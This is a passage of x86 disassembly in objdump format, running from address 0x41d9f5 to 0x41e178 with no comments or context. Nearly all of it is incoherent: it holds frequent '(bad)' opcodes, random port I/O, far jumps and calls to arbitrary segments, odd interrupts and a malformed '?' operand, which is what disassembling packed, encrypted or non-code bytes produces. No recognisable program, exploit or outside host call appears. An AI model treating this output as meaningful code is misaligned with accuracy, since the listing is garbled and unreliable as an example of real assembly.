  41d9f5:	stc    
  41d9f6:	xor    bh,BYTE PTR [edi+ebx*4+0x36ad88ae]
  41d9fd:	fmul   st,st(6)
  41d9ff:	pop    edx
  41da00:	or     DWORD PTR [ebp+0x6d2533e7],ecx
  41da06:	aad    0xf6
  41da08:	pop    esp
  41da09:	das    
  41da0a:	or     al,0xf6
  41da0c:	stos   DWORD PTR es:[edi],eax
  41da0d:	imul   eax,DWORD PTR [esi+0x35],0xa13dfcbd
  41da14:	mov    cl,dl
  41da16:	sahf   
  41da17:	jns    0x41d9b8
  41da19:	(bad)  
  41da1a:	arpl   WORD PTR [ecx],ax
  41da1c:	cmp    DWORD PTR [eax+0xa481d31],esp
  41da22:	ja     0x41d9d5
  41da24:	adc    al,0x38
  41da26:	cmp    DWORD PTR [eax],edi
  41da28:	mov    WORD PTR [esi],fs
  41da2a:	aaa    
  41da2b:	shl    BYTE PTR [edi+esi*2+0xa],cl
  41da2f:	popa   
  41da30:	icebp  
  41da31:	or     eax,0xc140b141
  41da36:	add    edi,DWORD PTR [ecx-0x36]
  41da39:	fldcw  WORD PTR [eax-0xf]
  41da3c:	add    eax,0xf4eacbcb
  41da41:	psllq  mm0,QWORD PTR [ebx+0x1201dad9]
  41da48:	int    0xa5
  41da4a:	mov    al,ds:0xab70e579
  41da4f:	repnz inc esi
  41da51:	mov    bh,ah
  41da53:	sbb    al,0xf3
  41da55:	push   ebp
  41da56:	pop    edx
  41da57:	(bad)  
  41da58:	aas    
  41da59:	ins    DWORD PTR es:[edi],dx
  41da5a:	cmp    ch,al
  41da5c:	mov    cl,0xc1
  41da5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da5f:	out    dx,al
  41da60:	and    cl,BYTE PTR [ebp+edx*1+0x4082fe19]
  41da67:	arpl   bx,cx
  41da69:	je     0x41dabc
  41da6b:	adc    esp,DWORD PTR [eax]
  41da6d:	mov    bh,0x15
  41da6f:	in     al,dx
  41da70:	push   es
  41da71:	ficom  WORD PTR [eax-0x74]
  41da74:	dec    ebp
  41da75:	retf   0x7af8
  41da78:	jns    0x41da33
  41da7a:	loopne 0x41da3d
  41da7c:	pop    ecx
  41da7d:	int3   
  41da7e:	mov    WORD PTR [edx],gs
  41da80:	sahf   
  41da81:	aam    0xa3
  41da83:	ror    DWORD PTR [edi-0x6c5a3bc6],1
  41da89:	rcr    BYTE PTR [esi],1
  41da8b:	js     0x41da86
  41da8d:	sub    al,0xfd
  41da8f:	repnz pushf 
  41da91:	outs   dx,DWORD PTR ds:[esi]
  41da92:	cmp    DWORD PTR [ebx],esi
  41da94:	mov    edi,0x87ebd981
  41da99:	xor    esi,DWORD PTR [ebp+0x58fc1947]
  41da9f:	adc    eax,DWORD PTR [ecx+ebp*2]
  41daa2:	aaa    
  41daa3:	aas    
  41daa4:	pop    es
  41daa5:	enter  0xc86d,0x43
  41daa9:	ret    
  41daaa:	inc    eax
  41daab:	fidiv  DWORD PTR [ebp-0x4a8f9fd]
  41dab1:	cmp    eax,0x6d7e42
  41dab6:	fwait
  41dab7:	into   
  41dab8:	mov    esi,0x6e2bea66
  41dabd:	jp     0x41dac2
  41dabf:	aas    
  41dac0:	pusha  
  41dac1:	bnd jle 0x41da7f
  41dac4:	retf   
  41dac5:	lea    esp,[ebx+ebp*4-0x375c13d]
  41dacc:	retf   
  41dacd:	mov    bl,BYTE PTR [edi-0x4c]
  41dad0:	cwde   
  41dad1:	(bad)  
  41dad3:	mov    cl,0x62
  41dad5:	retf   
  41dad6:	mov    esp,0xd0ab92df
  41dadb:	les    ebx,FWORD PTR [ecx+0xd6d8f29]
  41dae1:	popa   
  41dae2:	aaa    
  41dae3:	dec    ebp
  41dae4:	sub    al,0xa9
  41dae6:	out    0x65,eax
  41dae8:	sbb    al,0x2c
  41daea:	push   ss
  41daeb:	inc    esi
  41daec:	sub    DWORD PTR [esp+edi*1],ecx
  41daef:	and    bh,bh
  41daf1:	(bad)  
  41daf3:	sahf   
  41daf4:	imul   esp,DWORD PTR [ecx-0x2af63ec],0xffffff84
  41dafb:	cmc    
  41dafc:	aaa    
  41dafd:	ja     0x41da8f
  41daff:	fcmove st,st(3)
  41db01:	aaa    
  41db02:	(bad)  [edx]
  41db04:	(bad)  
  41db06:	mov    cl,0x2d
  41db08:	and    esp,DWORD PTR ds:0x532f7e93
  41db0e:	ret    
  41db0f:	(bad)  
  41db10:	int    0xda
  41db12:	fwait
  41db13:	push   ds
  41db14:	(bad)  
  41db15:	out    0xa4,eax
  41db17:	mov    bh,0xe5
  41db19:	sbb    al,0x21
  41db1b:	jb     0x41da9d
  41db1d:	sub    al,BYTE PTR [ecx]
  41db1f:	fdivr  st(4),st
  41db21:	mov    al,0x88
  41db23:	sbb    bl,BYTE PTR [ebx-0x4b]
  41db26:	inc    esi
  41db27:	fimul  DWORD PTR [esp+edi*4+0x79]
  41db2b:	loopne 0x41db07
  41db2d:	xor    al,0x82
  41db2f:	xchg   esi,eax
  41db30:	jbe    0x41dba7
  41db32:	mov    ch,0x5b
  41db35:	mov    ah,0xdf
  41db37:	shl    BYTE PTR [ecx],cl
  41db39:	loop   0x41db73
  41db3b:	dec    ebx
  41db3c:	and    edi,DWORD PTR [esi-0x57]
  41db3f:	jmp    0xb7e0:0x71d0b84d
  41db46:	push   ecx
  41db47:	add    eax,DWORD PTR [edx]
  41db49:	jmp    0x3f54:0xb0233062
  41db50:	test   cl,dl
  41db52:	repz out 0xe6,al
  41db55:	das    
  41db56:	cmp    dh,BYTE PTR [eax+0x1025dd36]
  41db5c:	ds cdq 
  41db5e:	mov    al,0x49
  41db60:	pop    edi
  41db61:	lds    esp,FWORD PTR [ecx]
  41db63:	add    BYTE PTR ds:[eax],al
	...
  41db6e:	add    BYTE PTR [eax],al
  41db70:	add    BYTE PTR [ecx-0x11],al
  41db73:	jnp    0x41dba3
  41db75:	(bad)  
  41db76:	mov    esi,0x1adaef55
  41db7b:	cmp    eax,0xb3113462
  41db80:	fst    QWORD PTR ds:0xab000157
  41db86:	add    eax,DWORD PTR [eax]
  41db88:	add    BYTE PTR [edx+0x23],al
  41db8b:	adc    DWORD PTR [ebx-0x52],0x2e12b80b
  41db92:	push   ss
  41db93:	add    eax,0x255388c4
  41db98:	outs   dx,BYTE PTR ds:[esi]
  41db99:	and    esi,DWORD PTR [esi-0x8a872ca]
  41db9f:	lea    edx,[eax+ecx*4+0x16]
  41dba3:	adc    al,0x1d
  41dba5:	out    0xcb,al
  41dba7:	test   BYTE PTR [edx],ch
  41dba9:	sub    ebp,ecx
  41dbab:	sti    
  41dbac:	add    al,0x50
  41dbae:	mov    cl,0xd0
  41dbb0:	xchg   ecx,eax
  41dbb1:	jns    0x41dbc1
  41dbb3:	in     eax,dx
  41dbb4:	sbb    ecx,ecx
  41dbb6:	clc    
  41dbb7:	inc    ebx
  41dbb8:	xor    bh,al
  41dbba:	test   BYTE PTR [edi],cl
  41dbbc:	jecxz  0x41dbeb
  41dbbe:	lods   al,BYTE PTR ds:[esi]
  41dbbf:	mov    esp,0xf142d5f9
  41dbc4:	jecxz  0x41dc3e
  41dbc6:	stos   BYTE PTR es:[edi],al
  41dbc7:	es rol ebp,1
  41dbca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbcb:	out    dx,eax
  41dbcc:	mov    bh,0x5c
  41dbce:	jl     0x41db80
  41dbd0:	dec    edi
  41dbd1:	cli    
  41dbd2:	jne    0x41dbd8
  41dbd4:	iret   
  41dbd5:	stos   DWORD PTR es:[edi],eax
  41dbd6:	jo     0x41dbde
  41dbd8:	popf   
  41dbd9:	pop    ss
  41dbda:	int    0xd6
  41dbdc:	in     eax,0x3d
  41dbde:	sub    ecx,ebp
  41dbe0:	cmp    al,0x7a
  41dbe2:	shl    BYTE PTR ds:0xba190d71,cl
  41dbe8:	addr16 cmp eax,0x3d258f15
  41dbee:	xchg   edx,eax
  41dbef:	or     al,0x27
  41dbf1:	imul   edx,DWORD PTR [ebp+0x1f],0xa8d4b58f
  41dbf8:	out    0x11,eax
  41dbfa:	mov    cl,0xca
  41dbfc:	dec    esp
  41dbfd:	jmp    0x90f04043
  41dc02:	xchg   ecx,eax
  41dc03:	and    BYTE PTR [ecx],dl
  41dc05:	sbb    eax,0x12c9171a
  41dc0a:	imul   esi,DWORD PTR fs:[ecx+esi*1+0x3519e6ea],0xffffff8d
  41dc13:	aaa    
  41dc14:	stos   DWORD PTR es:[edi],eax
  41dc15:	pop    ebp
  41dc16:	std    
  41dc17:	jns    0x41dbb9
  41dc19:	adc    DWORD PTR [edi-0x34866e2a],ebx
  41dc1f:	jns    0x41dc6c
  41dc21:	push   es
  41dc22:	je     0x41dbc8
  41dc24:	in     al,dx
  41dc25:	xlat   BYTE PTR ds:[ebx]
  41dc26:	mov    ah,0x95
  41dc28:	dec    edx
  41dc29:	xor    BYTE PTR [eax-0x3860f2cc],cl
  41dc2f:	popw   ss
  41dc31:	std    
  41dc32:	ja     0x41dc65
  41dc34:	call   0xe4f3:0xb97de5d1
  41dc3b:	inc    edi
  41dc3c:	dec    esi
  41dc3d:	and    eax,0x9a80c3d
  41dc42:	and    edx,DWORD PTR [edx-0x7aabcfde]
  41dc48:	xor    dl,dh
  41dc4a:	stos   BYTE PTR es:[edi],al
  41dc4b:	xchg   DWORD PTR [edi+0x654b38b],eax
  41dc51:	les    ebp,FWORD PTR [ecx]
  41dc53:	dec    edi
  41dc54:	(bad)  
  41dc55:	dec    edx
  41dc56:	aas    
  41dc57:	popa   
  41dc58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc59:	mov    edi,0x7dd4a576
  41dc5e:	mov    DWORD PTR [ecx],esp
  41dc60:	xor    al,0x2f
  41dc62:	or     BYTE PTR [ebx-0x120b67a6],al
  41dc68:	jle    0x41dc7d
  41dc6a:	rcl    DWORD PTR [esi],0x1a
  41dc6d:	sbb    al,0x43
  41dc6f:	in     al,0x21
  41dc71:	pop    edi
  41dc72:	jbe    0x41dc75
  41dc74:	mov    ah,0xa7
  41dc76:	ins    BYTE PTR es:[edi],dx
  41dc77:	push   ecx
  41dc78:	ds adc al,0x10
  41dc7b:	or     BYTE PTR [edx],bl
  41dc7d:	or     al,0x72
  41dc7f:	cmc    
  41dc80:	into   
  41dc81:	inc    ebp
  41dc82:	push   ebx
  41dc83:	xchg   edx,eax
  41dc84:	nop
  41dc85:	pop    ebp
  41dc86:	lods   eax,DWORD PTR ds:[esi]
  41dc87:	push   ss
  41dc88:	jnp    0x41dc5d
  41dc8a:	call   0xf096:0xd37cf328
  41dc91:	mov    dh,0x78
  41dc94:	lahf   
  41dc95:	xor    BYTE PTR [ebx-0x30],ch
  41dc98:	jmp    0x41dcaf
  41dc9a:	mov    dl,0xbd
  41dc9c:	lock cmp BYTE PTR [ebp+eax*4+0x63],bh
  41dca1:	sahf   
  41dca2:	call   0x79e7:0x8388d0bd
  41dca9:	sub    ah,BYTE PTR ss:[ebp+ebx*8-0x49]
  41dcae:	stos   BYTE PTR es:[edi],al
  41dcaf:	cmp    cl,bh
  41dcb1:	adc    esi,ebx
  41dcb3:	pop    ds
  41dcb4:	adc    eax,0x9779119b
  41dcb9:	hlt    
  41dcba:	xor    ah,BYTE PTR [edi+0x3a]
  41dcbd:	push   ds
  41dcbe:	in     al,0x69
  41dcc0:	pushf  
  41dcc1:	movhps QWORD PTR [esi+0x63936082],xmm0
  41dcc8:	ret    0xe1c0
  41dccb:	inc    esi
  41dccc:	push   es
  41dccd:	test   al,0x8d
  41dccf:	stos   BYTE PTR es:[edi],al
  41dcd0:	sbb    al,0xe9
  41dcd2:	cmp    edx,DWORD PTR [eax+ecx*8]
  41dcd5:	mov    ah,0x51
  41dcd7:	or     al,BYTE PTR [esi]
  41dcd9:	gs inc ebp
  41dcdb:	mov    WORD PTR [ebx+0x7d94ee30],cs
  41dce1:	loope  0x41dd34
  41dce3:	ficom  DWORD PTR [eax]
  41dce5:	jmp    0xb90bd297
  41dcea:	ds loopne 0x41dd2a
  41dced:	out    0x81,eax
  41dcef:	and    DWORD PTR [eax+0x29668182],esp
  41dcf5:	mov    dl,0x38
  41dcf7:	mov    dl,BYTE PTR [eax-0x637758c5]
  41dcfd:	jno    0x41dcc6
  41dcff:	dec    ebx
  41dd00:	int    0x2b
  41dd02:	adc    BYTE PTR [ecx+0x4],dh
  41dd05:	jns    0x41dd2e
  41dd07:	int3   
  41dd08:	xor    BYTE PTR [edx+0x72],0x4b
  41dd0c:	xchg   edi,eax
  41dd0d:	into   
  41dd0e:	pop    esp
  41dd0f:	dec    esi
  41dd10:	push   es
  41dd11:	mov    ch,0x94
  41dd13:	inc    esp
  41dd14:	(bad)  
  41dd15:	(bad)  
  41dd16:	jnp    0x41dcb3
  41dd18:	movups XMMWORD PTR [ecx-0x6f53f0f8],xmm7
  41dd1f:	repnz mov al,0xb4
  41dd22:	xor    eax,0x51594f82
  41dd27:	pusha  
  41dd28:	push   ecx
  41dd29:	mov    dl,0x1e
  41dd2b:	out    0x53,al
  41dd2d:	ret    0x9f00
  41dd30:	fstp   st(1)
  41dd32:	mov    ecx,0x63c6f614
  41dd37:	popa   
  41dd38:	mov    eax,0x262cb34a
  41dd3d:	mov    ebx,0xdfd5e2bc
  41dd42:	mov    WORD PTR [esp+ecx*4+0x42],ss
  41dd46:	cmp    DWORD PTR [esi],eax
  41dd48:	mov    ecx,0x30b507ac
  41dd4d:	mov    ah,0x99
  41dd4f:	add    eax,0xb7a0d3a1
  41dd54:	push   es
  41dd55:	push   eax
  41dd56:	outs   dx,DWORD PTR ds:[esi]
  41dd58:	(bad)  [esi-0x4c]
  41dd5b:	sbb    dl,BYTE PTR [eax-0x7c6258f0]
  41dd61:	arpl   si,bx
  41dd63:	pop    ds
  41dd64:	repnz dec ecx
  41dd66:	pop    ss
  41dd67:	and    ebx,DWORD PTR [ebx]
  41dd69:	mov    bl,0xc0
  41dd6b:	sbb    esi,esp
  41dd6d:	pop    es
  41dd6e:	adc    eax,0xce8a36fc
  41dd73:	inc    ecx
  41dd74:	pop    ecx
  41dd75:	jae    0x41dd8d
  41dd77:	pusha  
  41dd78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd79:	inc    edx
  41dd7a:	push   ds
  41dd7b:	jmp    0x56307fd1
  41dd80:	hlt    
  41dd81:	pop    ecx
  41dd82:	aad    0xae
  41dd84:	dec    ebp
  41dd85:	mov    WORD PTR [esi-0x2ccf66e7],ds
  41dd8b:	jmp    0x41dde5
  41dd8d:	outs   dx,DWORD PTR ds:[esi]
  41dd8e:	ins    BYTE PTR es:[edi],dx
  41dd8f:	fstp   st(7)
  41dd91:	dec    eax
  41dd92:	sub    DWORD PTR ds:0xc3f31c50,0x829a265e
  41dd9c:	in     eax,0x5e
  41dd9e:	sbb    BYTE PTR [edx-0x54f36744],dl
  41dda4:	xor    eax,0xb085421d
  41dda9:	rcr    BYTE PTR [ecx+0x747ad759],1
  41ddaf:	js     0x41dd77
  41ddb1:	add    al,0xe3
  41ddb3:	jmp    0x41dd7d
  41ddb5:	cmp    ebx,DWORD PTR [esi-0x1]
  41ddb8:	sbb    al,0x38
  41ddba:	gs xor dh,0x71
  41ddbe:	lea    edi,[ebp+0x2d]
  41ddc1:	mov    ah,BYTE PTR [edx+0x41]
  41ddc4:	jnp    0x41ddda
  41ddc6:	enter  0xec6,0x14
  41ddca:	sub    DWORD PTR [ebp+0x6c83b003],eax
  41ddd0:	fimul  WORD PTR [edi]
  41ddd2:	mov    ds:0x1cfa3c1f,al
  41ddd7:	and    dl,BYTE PTR [ecx+0x5e]
  41ddda:	(bad)  
  41dddc:	(bad)  
  41dddd:	not    DWORD PTR [ebp+ebx*8+0x3a95b800]
  41dde4:	mov    ebx,0xe1991173
  41dde9:	xchg   ebx,eax
  41ddea:	sahf   
  41ddeb:	jecxz  0x41dd7f
  41dded:	pop    es
  41ddee:	out    0x37,eax
  41ddf0:	iret   
  41ddf1:	mov    bl,BYTE PTR ss:[ebp-0x48]
  41ddf5:	fist   WORD PTR [esi-0x6bb01c99]
  41ddfb:	nop
  41ddfc:	fist   WORD PTR [ecx]
  41ddfe:	and    al,0xa5
  41de00:	mov    WORD PTR [esi+ebx*4+0x19fda26c],ss
  41de07:	sbb    BYTE PTR [ecx],dh
  41de09:	imul   edx,DWORD PTR [ebp+0x480449c3],0xcb7ed833
  41de13:	mov    ds:0x5de6e403,al
  41de18:	icebp  
  41de19:	jb     0x41de12
  41de1b:	or     DWORD PTR [esi],edi
  41de1d:	ins    DWORD PTR es:[edi],dx
  41de1e:	inc    eax
  41de1f:	jmp    0x41ddd0
  41de21:	mov    esi,0xa1cc3649
  41de26:	or     eax,0x1dee30f1
  41de2b:	push   eax
  41de2c:	mov    edx,0x359ce7e8
  41de31:	aam    0x25
  41de33:	loop   0x41dea1
  41de35:	hlt    
  41de36:	mov    edi,DWORD PTR [ecx-0x71bb4df]
  41de3c:	popa   
  41de3d:	mov    eax,ds:0x452298ed
  41de42:	fldenv [edx+0x17078d9f]
  41de48:	push   0x9504782f
  41de4d:	dec    eax
  41de4e:	outs   dx,DWORD PTR ds:[esi]
  41de4f:	mov    eax,ds:0x4da465dc
  41de54:	adc    dl,ch
  41de56:	adc    ah,dh
  41de58:	adc    DWORD PTR [edx+0x7e],edx
  41de5b:	and    BYTE PTR [edx+0x30951582],ch
  41de61:	addr16 sub eax,0xdd8a3530
  41de67:	jbe    0x41de2a
  41de69:	mov    cl,0x4e
  41de6b:	cmp    edi,DWORD PTR [ebx-0x2]
  41de6e:	loope  0x41dec5
  41de70:	lahf   
  41de71:	pop    es
  41de72:	dec    edi
  41de73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de74:	not    DWORD PTR [edi+0x39]
  41de77:	and    ch,BYTE PTR [esi-0x32]
  41de7a:	push   edi
  41de7b:	xchg   esp,eax
  41de7c:	push   0x65
  41de7e:	pop    ecx
  41de7f:	enter  0x9d16,0x95
  41de83:	popf   
  41de84:	sub    ch,BYTE PTR [edx-0x35]
  41de87:	mov    ds:0x5f0e67a3,al
  41de8c:	repz pop ss
  41de8e:	pushf  
  41de8f:	xchg   edi,eax
  41de90:	shl    DWORD PTR [ecx+0x59],cl
  41de93:	jmp    0xb05:0x83ca76a1
  41de9a:	sar    BYTE PTR [ecx+0x5f],0x82
  41de9e:	mov    esp,0xdc3be927
  41dea3:	fisttp QWORD PTR [esi]
  41dea5:	push   edx
  41dea6:	pop    ecx
  41dea7:	ret    0xa15c
  41deaa:	mov    bl,BYTE PTR [esi+ebx*8]
  41dead:	test   BYTE PTR [eax+0x52668dd8],ah
  41deb3:	inc    ecx
  41deb4:	push   es
  41deb5:	or     esi,DWORD PTR [ebp+0x631badc3]
  41debb:	shr    DWORD PTR [edi],cl
  41debd:	jns    0x41def0
  41debf:	mov    al,0x1e
  41dec1:	aas    
  41dec2:	push   edx
  41dec3:	sub    ah,ch
  41dec5:	inc    BYTE PTR [edx]
  41dec7:	push   ebp
  41dec8:	and    BYTE PTR [ecx+0x57],dl
  41decb:	xchg   bh,al
  41decd:	xchg   edx,eax
  41dece:	leave  
  41decf:	(bad)  
  41ded0:	sti    
  41ded1:	jmp    0x41df2a
  41ded3:	inc    ebx
  41ded4:	and    BYTE PTR [edx-0x15e648dd],dh
  41deda:	mov    esp,0x7913f023
  41dedf:	jle    0x41defb
  41dee1:	loop   0x41de75
  41dee3:	inc    edi
  41dee4:	xchg   ebx,eax
  41dee5:	pop    es
  41dee6:	xchg   ebp,eax
  41dee7:	sbb    ch,BYTE PTR [eax+esi*1+0x2e7aa3e6]
  41deee:	es in  eax,dx
  41def0:	hlt    
  41def1:	mov    ?,esp
  41def3:	loop   0x41defd
  41def5:	repz and bh,BYTE PTR [ecx]
  41def8:	popa   
  41def9:	test   al,0x6e
  41defb:	cwde   
  41defc:	mov    edi,0x90b69589
  41df01:	ins    DWORD PTR es:[edi],dx
  41df02:	ja     0x41df75
  41df04:	jne    0x41df30
  41df06:	pop    ds
  41df07:	jl     0x41decd
  41df09:	inc    esp
  41df0a:	addr16 mov ebp,0xa136836e
  41df10:	sub    DWORD PTR [ebx-0x6c],esp
  41df13:	dec    eax
  41df14:	push   ebx
  41df15:	mov    ah,0x81
  41df17:	jns    0x41de9b
  41df19:	xor    BYTE PTR [ebx+ebp*1-0x39514e5f],0x72
  41df21:	fldcw  WORD PTR [edi-0x4b]
  41df24:	jle    0x41deb7
  41df26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df27:	pop    ecx
  41df28:	in     al,dx
  41df29:	int    0xfe
  41df2b:	mov    ebp,0x28c88d93
  41df30:	add    dl,BYTE PTR [ebx]
  41df32:	adc    edx,ebp
	...
  41df40:	add    BYTE PTR ds:0x7f7d7f79,dl
  41df46:	jg     0x41df5f
  41df48:	jns    0x41df1b
  41df4a:	pop    cx
  41df4c:	adc    BYTE PTR [edi-0x3f1bfaa5],0x5a
  41df53:	add    DWORD PTR [eax],eax
  41df55:	stos   DWORD PTR es:[edi],eax
  41df56:	add    eax,DWORD PTR [eax]
  41df58:	add    ah,bh
  41df5a:	ss aad 0xdc
  41df5d:	in     eax,0xfd
  41df5f:	push   ecx
  41df60:	mov    esi,DWORD PTR [eax-0x16]
  41df63:	mov    ch,0x46
  41df65:	aas    
  41df66:	mov    al,ds:0xcf41b32c
  41df6b:	xor    ch,BYTE PTR [edx+edx*1]
  41df6e:	jns    0x41df6a
  41df70:	scas   eax,DWORD PTR es:[edi]
  41df71:	(bad)  
  41df72:	in     eax,0xf7
  41df74:	and    al,0x12
  41df76:	retf   
  41df77:	jg     0x41df64
  41df79:	repz jmp 0x41df57
  41df7c:	loope  0x41dffb
  41df7e:	mov    dh,0x2f
  41df80:	cld    
  41df81:	aad    0x22
  41df83:	ins    BYTE PTR es:[edi],dx
  41df84:	(bad)  [ebx+0x1c4023b1]
  41df8a:	sub    cl,ah
  41df8c:	add    esi,eax
  41df8e:	pop    ebx
  41df8f:	(bad)  
  41df90:	pop    ebp
  41df91:	push   0x25
  41df93:	(bad)  
  41df94:	jo     0x41df90
  41df96:	in     al,0xb6
  41df98:	ss lahf 
  41df9a:	sub    al,BYTE PTR ds:0x9c5e259d
  41dfa0:	pop    ebx
  41dfa1:	sub    eax,0x7e071bd9
  41dfa6:	jns    0x41df55
  41dfa8:	cli    
  41dfa9:	call   0xf229d725
  41dfae:	stos   BYTE PTR es:[edi],al
  41dfaf:	sub    eax,0x4c52eb6f
  41dfb4:	pop    ebp
  41dfb5:	ins    BYTE PTR es:[edi],dx
  41dfb6:	and    eax,0x468b2a29
  41dfbb:	repnz outs dx,BYTE PTR ds:[esi]
  41dfbd:	cmc    
  41dfbe:	out    dx,al
  41dfbf:	ins    BYTE PTR es:[di],dx
  41dfc1:	in     al,0x6b
  41dfc3:	jae    0x41e01f
  41dfc5:	cmp    al,0x33
  41dfc7:	inc    ecx
  41dfc8:	cld    
  41dfc9:	pop    eax
  41dfca:	das    
  41dfcb:	into   
  41dfcc:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfce:	mov    ds:0x215a9c92,eax
  41dfd3:	jmp    0x3fef85c
  41dfd8:	xchg   DWORD PTR [edi],ebx
  41dfda:	in     al,0xb4
  41dfdc:	cwde   
  41dfdd:	sbb    al,0xfd
  41dfdf:	lea    ecx,[ebp+0x1e55652a]
  41dfe5:	cmp    ecx,DWORD PTR [ebp+0x7c]
  41dfe8:	pop    esp
  41dfe9:	call   FWORD PTR [edx]
  41dfeb:	and    DWORD PTR [ebx-0x73],edx
  41dfee:	add    ebp,DWORD PTR [ecx]
  41dff0:	mov    ds:0xb127c5be,al
  41dff5:	sub    ah,BYTE PTR [ecx-0x44473d6e]
  41dffb:	into   
  41dffc:	fldl2e 
  41dffe:	push   ebx
  41dfff:	imul   ebp,DWORD PTR [edi-0x14bb31c0],0xbd39a589
  41e009:	inc    ebx
  41e00a:	in     eax,dx
  41e00b:	fstp   QWORD PTR [ebx]
  41e00d:	push   ss
  41e00e:	sbb    eax,0x6205e4d4
  41e013:	shl    BYTE PTR [edx-0xf86e00d],cl
  41e019:	or     edi,ebp
  41e01b:	cwde   
  41e01c:	leave  
  41e01d:	mov    ebp,0x4d9ecb7d
  41e022:	push   ss
  41e023:	fmul   DWORD PTR [edi-0x46]
  41e026:	outs   dx,BYTE PTR ds:[esi]
  41e027:	jo     0x41e05e
  41e029:	mov    esi,gs
  41e02b:	xchg   esi,eax
  41e02c:	jnp    0x41e06c
  41e02e:	(bad)  
  41e02f:	fistp  WORD PTR [ecx-0x6eccd7e1]
  41e035:	and    DWORD PTR [ecx+0x4e],edi
  41e038:	dec    edi
  41e039:	rol    DWORD PTR [eax-0x2be10dfa],cl
  41e03f:	mov    ds:0x8511f93d,eax
  41e044:	nop
  41e045:	lds    esi,FWORD PTR [edi]
  41e047:	jmp    0xbadb:0x3ff93084
  41e04e:	neg    DWORD PTR [esi]
  41e050:	into   
  41e051:	in     eax,0x66
  41e053:	sbb    BYTE PTR [ecx-0x7d],dl
  41e056:	lods   al,BYTE PTR ds:[esi]
  41e057:	jle    0x41e04e
  41e059:	mov    al,0xa3
  41e05b:	pushf  
  41e05c:	xor    edx,DWORD PTR [edi]
  41e05e:	(bad)  
  41e05f:	or     al,0x90
  41e061:	sti    
  41e062:	jnp    0x41e0df
  41e064:	outs   dx,DWORD PTR ds:[esi]
  41e065:	mov    bh,BYTE PTR [ebx+0x5a]
  41e068:	sub    eax,0xcde8b36e
  41e06d:	pusha  
  41e06e:	mov    ebx,0x743d3050
  41e073:	and    DWORD PTR [ebp-0x55539cb0],ecx
  41e079:	add    al,0x1c
  41e07b:	xchg   DWORD PTR fs:[ebx+0x7fb8f259],ecx
  41e082:	jns    0x41e08b
  41e084:	fwait
  41e085:	jae    0x41e056
  41e087:	repnz push ebx
  41e089:	pop    ecx
  41e08a:	shl    edx,cl
  41e08c:	cmp    al,BYTE PTR [eax+ecx*4-0x7221237]
  41e093:	and    al,0x46
  41e095:	pop    esi
  41e096:	jmp    0xbd8e226b
  41e09b:	in     eax,0xf2
  41e09d:	jno    0x41e101
  41e09f:	push   ss
  41e0a0:	sub    al,0xa4
  41e0a2:	mov    ebx,0x6d9c1352
  41e0a7:	or     edx,eax
  41e0a9:	push   es
  41e0aa:	mov    dl,ah
  41e0ac:	push   0x6fb14d67
  41e0b1:	fstp   TBYTE PTR [edx-0x31744902]
  41e0b7:	outs   dx,BYTE PTR ds:[esi]
  41e0b8:	rol    edi,cl
  41e0ba:	jge    0x41e087
  41e0bc:	sub    ch,ah
  41e0be:	cmp    bl,BYTE PTR [esi-0x16ed64ba]
  41e0c4:	addr16 mov cl,dh
  41e0c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0c8:	mov    ecx,0xc45ec7dd
  41e0cd:	mov    ebp,0xc6460040
  41e0d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0d3:	mov    ah,BYTE PTR ds:0x1d27786b
  41e0d9:	fisttp DWORD PTR [edi+0x17]
  41e0dc:	loopne 0x41e0c4
  41e0de:	push   esp
  41e0df:	xchg   esp,eax
  41e0e0:	std    
  41e0e1:	pop    ecx
  41e0e2:	stos   DWORD PTR es:[edi],eax
  41e0e3:	jno    0x41e10e
  41e0e5:	pop    ebp
  41e0e6:	arpl   WORD PTR [ecx+0x7ed8f34c],dx
  41e0ec:	cmp    al,0x7c
  41e0ee:	loope  0x41e156
  41e0f0:	div    BYTE PTR [ebp-0x5ff9c289]
  41e0f6:	ret    
  41e0f7:	jle    0x41e0b5
  41e0f9:	iret   
  41e0fa:	mov    eax,ds:0xd21040e7
  41e0ff:	out    0xe8,al
  41e101:	ins    DWORD PTR es:[edi],dx
  41e102:	test   BYTE PTR [ebx-0x1b68e4d8],dl
  41e108:	inc    esp
  41e109:	adc    BYTE PTR [edx],cl
  41e10b:	xor    bl,dl
  41e10d:	(bad)  [ecx-0x2e]
  41e110:	dec    esp
  41e111:	xchg   ebx,eax
  41e112:	or     bl,BYTE PTR [edx+0x54]
  41e115:	stos   DWORD PTR es:[edi],eax
  41e116:	clc    
  41e117:	dec    edi
  41e118:	je     0x41e121
  41e11a:	ror    DWORD PTR [esi-0x3cef8435],cl
  41e120:	xchg   al,al
  41e122:	adc    eax,0xe664019d
  41e127:	dec    esp
  41e128:	hlt    
  41e129:	in     al,dx
  41e12a:	cmp    BYTE PTR [esi+0x63],bh
  41e12d:	push   esi
  41e12e:	lahf   
  41e12f:	xor    dl,BYTE PTR [ebx-0x2a]
  41e132:	aas    
  41e133:	mov    ds:0x6526730,al
  41e138:	push   ds
  41e139:	jg     0x41e0cd
  41e13b:	xchg   bp,ax
  41e13d:	ret    0xd8ee
  41e140:	fnsave [edx]
  41e142:	js     0x41e12b
  41e144:	imul   ebp,DWORD PTR [ebx],0x580eb295
  41e14a:	out    0xea,al
  41e14c:	mov    edx,0xef4a354f
  41e151:	jbe    0x41e165
  41e153:	push   es
  41e154:	pop    ss
  41e155:	ja     0x41e0f7
  41e157:	fimul  WORD PTR [esi+0x6e]
  41e15a:	dec    esp
  41e15b:	ret    0xfa79
  41e15e:	pop    edx
  41e15f:	out    0xc7,al
  41e161:	inc    esp
  41e162:	push   esp
  41e163:	jns    0x41e10e
  41e165:	cwde   
  41e166:	xchg   edx,eax
  41e167:	test   al,0xa3
  41e169:	jle    0x41e175
  41e16b:	push   es
  41e16c:	xchg   esp,eax
  41e16d:	stos   DWORD PTR es:[edi],eax
  41e16e:	mov    eax,ds:0x157c1174
  41e173:	pop    es
  41e174:	push   0xffffff92
  41e176:	jbe    0x41e16a
  41e178:	xchg   ebp,eax
